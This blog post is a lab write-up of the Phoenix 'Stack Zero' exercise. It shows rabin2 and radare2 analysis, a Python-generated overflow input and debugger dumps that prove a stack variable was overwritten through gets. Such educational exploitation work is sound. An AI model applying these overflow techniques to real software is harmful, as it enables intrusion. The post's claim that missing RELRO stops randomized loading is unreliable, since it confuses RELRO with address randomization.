---
layout: post
title:  "Phoenix Stack Zero"
categories: exploit-education phoenix x86
---
Phoenix is a virtual machine that can be obtained from [exploit.education][exploit-education]. It provides an educational environment so that one can practice on their skills. For additional details, visit the website.

In case of reluctancy due to the risk of downloading an unknown virtual machine, Debian packages are also provided.

Stack Zero, which is the first level, introduces the legendary stack-based buffer overflow.

In order to get a glimpse of what the binary is all about, [rabin2][rabin2-docs] comes to the rescue:

{% highlight shell %}
$ rabin2 -I /opt/phoenix/i486/stack-zero
arch     x86
baddr    0x8048000
binsz    3394
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (GNU) 7.3.0
crypto   false
endian   little
havecode true
intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    no
rpath    /opt/phoenix/i486-linux-musl/lib
sanitiz  false
static   false
stripped false
subsys   linux
va       true
{% endhighlight %}

What can be gathered from the above info are the following:
* The binary is a 32-bit Linux ELF (`arch x86`, `bintype elf`, `bits 32`, `class ELF32`, `os linux`..).
* The endianness is little (`endian little`).
* It wasn't compiled with the Stack Smashing Protector (SSP) compiler feature (`canary false`), thus allowing stack-based buffer overflow.
* It wasn't compiled with the Data Execution Prevention (DEP) or No-Execute (NX) compiler feature (`nx false`), which cannot prevent shellcode execution.
* It wasn't compiled with the RELocation Read-Only compiler feature (`relro no`), which means that the binary and all of its dependencies are not loaded into randomized locations within virtual memory each time it is executed. This feature hinders Return Oriented Programming a lot.

Considering the above information, if the binary accepts input via environment variables, arguments or STDIN, it can be exploited.

To open the binary, `r2` can be used.

{% highlight shell %}
$ r2 /opt/phoenix/i486/stack-zero
> aas
{% endhighlight %}

It is not recommended to use `aaa` or `-A` as an argument when opening a binary, because it could take a really long time if that binary is big. Using radare2, one needs to know what analysis is more beneficial at every stage of reverse engineering a binary. In this particular case, `aas`, which uses binary header information to find public functions, is good enough.

{% highlight nasm %}
> afl
0x080482b4    1 17           sym._init
0x08048470    7 277  -> 112  sym.frame_dummy
0x08048520    5 49           sym.__do_global_ctors_aux
0x08048551    1 12           sym._fini
0x080483f0    8 113  -> 111  sym.__do_global_dtors_aux
0x08048114   46 498  -> 594  sym..interp
0x08048320    1 62           entry0
0x08048310    1 6            sym.imp.__libc_start_main
0x08048630    3 62           loc.__GNU_EH_FRAME_HDR
0x08048688    1 41           obj.__EH_FRAME_BEGIN
0x08048360    4 49   -> 40   sym.deregister_tm_clones
0x080484b5    4 106          main
0x080482f0    1 6            sym.imp.puts
{% endhighlight %}

There are a couple options available to view the disassembly at a particular address. One that can be used is `s` to seek to that address and then use `pdf` to disassemble the current function, or `VV` to use the Visual Graph.

{% highlight nasm %}
> s main
> pdf
/ (fcn) main 106
|   int main (int argc, char **argv, char **envp);
|           ; var int32_t var_4ch @ ebp-0x4c
|           ; var int32_t var_ch @ ebp-0xc
|           ; arg int32_t arg_4h @ esp+0x4
|           ; DATA XREF from entry0 @ 0x8048354
|           0x080484b5      8d4c2404       lea ecx, [arg_4h]
|           0x080484b9      83e4f0         and esp, 0xfffffff0
|           0x080484bc      ff71fc         push dword [ecx - 4]
|           0x080484bf      55             push ebp
|           0x080484c0      89e5           mov ebp, esp
|           0x080484c2      51             push ecx
|           0x080484c3      83ec54         sub esp, 0x54
|           0x080484c6      83ec0c         sub esp, 0xc
|           0x080484c9      6860850408     push str.Welcome_to_phoenix_stack_zero__brought_to_you_by_https:__exploit.education ; sym..rodata
|                                                                      ; 0x8048560 ; "Welcome to phoenix/stack-zero, brought to you by https://exploit.education"
|           0x080484ce      e81dfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080484d3      83c410         add esp, 0x10
|           0x080484d6      c745f4000000.  mov dword [var_ch], 0
|           0x080484dd      83ec0c         sub esp, 0xc
|           0x080484e0      8d45b4         lea eax, [var_4ch]
|           0x080484e3      50             push eax
|           0x080484e4      e8f7fdffff     call sym.imp.gets           ; sym..interp+0x1cc
|           0x080484e9      83c410         add esp, 0x10
|           0x080484ec      8b45f4         mov eax, dword [var_ch]
|           0x080484ef      85c0           test eax, eax
|       ,=< 0x080484f1      7412           je 0x8048505
|       |   0x080484f3      83ec0c         sub esp, 0xc
|       |   0x080484f6      68ac850408     push str.Well_done__the__changeme__variable_has_been_changed ; 0x80485ac ; "Well done, the 'changeme' variable has been changed!"
|       |   0x080484fb      e8f0fdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048500      83c410         add esp, 0x10
|      ,==< 0x08048503      eb10           jmp 0x8048515
|      |`-> 0x08048505      83ec0c         sub esp, 0xc
|      |    0x08048508      68e4850408     push str.Uh_oh___changeme__has_not_yet_been_changed._Would_you_like_to_try_again ; 0x80485e4 ; "Uh oh, 'changeme' has not yet been changed. Would you like to try again?"
|      |    0x0804850d      e8defdffff     call sym.imp.puts           ; int puts(const char *s)
|      |    0x08048512      83c410         add esp, 0x10
|      |    ; CODE XREF from main @ 0x8048503
|      `--> 0x08048515      83ec0c         sub esp, 0xc
|           0x08048518      6a00           push 0
\           0x0804851a      e8e1fdffff     call sym.imp.exit           ; sym..interp+0x1ec
{% endhighlight %}

There are a few things that can be seen from the disassembled main function:
1. There are two local variables:
    * `var_4ch`, which is the buffer where the input from STDIN is saved at and it has a size of `0x4c-0xc=0x40` (64 bytes in decimal).
    * `var_ch`, which is a 32-bit integer.
1. There is a call to `gets` with `var_4ch` as an argument at `0x080484e4`. `gets` does not restrict the size of bytes that are to be read and is, thus, vulnerable to stack-based buffer overflow.
1. The objective is to change the value of `var_ch`, which is tested at address `0x080484ef`.

With that in mind, to exploit this the input must have a size of, at least, 65 bytes (64 is the size of the buffer and to overwrite the value of `var_ch` one more byte at minimum is needed).

Before opening the binary in debugger mode using radare2, a rarun2 profile is needed so that the input can be read from the binary. In order to do that, a file needs to be created with the following contents:

{% highlight shell %}
#!/usr/bin/env rarun2
stdio=/dev/pts/0    # Replace `/dev/pts/0` with the output of the command `tty`.
stdin=./pattern     # Replace `./pattern` with the full path to the file that
                    # contains the input to be read from the binary.
{% endhighlight %}

One more thing that is essential is a file that contains the input. For that, python3 is going to be used.

{% highlight python %}
#!/usr/bin/env python3
print("X"*64+"AAAA")
{% endhighlight %}

{% highlight shell %}
$ ./myScript.py > pattern
{% endhighlight %}

Now, the binary can be debugged as follows:

{% highlight shell %}
$ r2 -d /opt/phoenix/i486/stack-zero -e dbg.profile=myProfile.rr2
{% endhighlight %}

To showcase that the binary is indeed vulnerable, a breakpoint before the call to `gets` is necessary. That can be done by simply executing `db` followed by the address and then `dc` to continue until the breakpoint is hit.

{% highlight plaintext %}
> aas
> db 0x080484e4
> dc
{% endhighlight %}

Before calling `gets`, it is a good idea to check the value of `var_ch`. This can be accomplished by first checking the value of the `ebp` register, via `dr`, and then viewing the hexdump at address `ebp-0xc`, via `px/xw`.

{% highlight nasm %}
> dr
eax = 0xff8c805c
ebx = 0xf7f14000
ecx = 0xff8c7f90
edx = 0x00000000
esi = 0xff8c8134
edi = 0x00000001
esp = 0xff8c8040
ebp = 0xff8c80a8
eip = 0x080484e4
eflags = 0x00000296
oeax = 0xffffffff
> px/xw 0xff8c80a8-0xc
0xff8c809c  0x00000000                                   ....
{% endhighlight %}

To execute the next instruction by stepping over, simply use `dso`.

{% highlight nasm %}
> dso
> dr
eax = 0xff8c805c
ebx = 0xf7f14000
ecx = 0xfefeff09
edx = 0x80808000
esi = 0xff8c8134
edi = 0x00000001
esp = 0xff8c8040
ebp = 0xff8c80a8
eip = 0x080484e9
eflags = 0x00000286
oeax = 0xffffffff
> px/24xw 0xff8c8040
0xff8c8040  0xff8c805c 0x00000000 0x0000006f 0x00000010  \.......o.......
0xff8c8050  0x080482b4 0x08048551 0x00000000 0x58585858  ....Q.......XXXX
0xff8c8060  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xff8c8070  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xff8c8080  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xff8c8090  0x58585858 0x58585858 0x58585858 0x41414141  XXXXXXXXXXXXAAAA
> px/xw 0xff8c80a8-0xc
0xff8c809c  0x41414141                                   AAAA
{% endhighlight %}

As shown above, the value of `var_ch` is indeed overwritten.

{% highlight plaintext %}
> dc
Well done, the 'changeme' variable has been changed!
{% endhighlight %}

## Conclusion
The binary was not compiled with the necessary features that would otherwise prevent stack-based buffer overflows and contains a call to `gets`, which does not account the size of bytes to be read from STDIN. As such, one needs to account the size of the buffer and simply input more bytes than it can actually hold so that the stack overflows.

[exploit-education]: https://exploit.education/downloads/
[rabin2-docs]: https://r2wiki.readthedocs.io/en/latest/tools/rabin2/
